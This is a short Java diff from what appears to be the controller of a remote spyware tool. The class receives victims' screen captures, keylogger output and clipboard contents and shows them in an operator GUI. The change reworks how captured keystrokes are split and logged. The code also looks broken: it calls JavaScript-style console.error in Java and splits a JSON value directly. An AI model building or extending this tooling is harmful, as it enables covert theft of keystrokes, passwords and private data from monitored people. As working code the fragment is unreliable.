@@ -21,9 +21,9 @@ import java.util.Vector;
 
 import static utils.Command.*;
 import static utils.Command.COMMAND_CLIENT_SCREEN;
+import static utils.Environment.KEYLOGGER_SPLITTER;
 
 public class ConsumeController {
-
     private static Map<String, ConsumeExecutable<JSON>> controller = new HashMap();
 
     public static void init() {
@@ -49,7 +49,6 @@ public class ConsumeController {
             BufferedImage image2 = ImageIO.read(ImageIO.createImageInputStream(temp));
             ImageIcon temp1 = new ImageIcon(image2);
             Admin.getGui().updateClientScreen(temp1);
-            console.log("alo");
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
@@ -62,10 +61,11 @@ public class ConsumeController {
     }
 
     private static void getKeylogger(JSON input, Admin admin) {
-        JSONArray logs = new JSONArray(input.get("keylogger").toString());
-        logs.forEach(log -> {
-            Admin.getGui().appendLog("[Keylog] " + log.toString());
-        });
+        console.error(input.get("keylogger"));
+        String[] logs = input.get("keylogger").split(KEYLOGGER_SPLITTER);
+        for(String log : logs) {
+            Admin.getGui().appendLog("[Keylog] " + log);
+        }
     }
 
     private static void getClipboard(JSON input, Admin admin) {
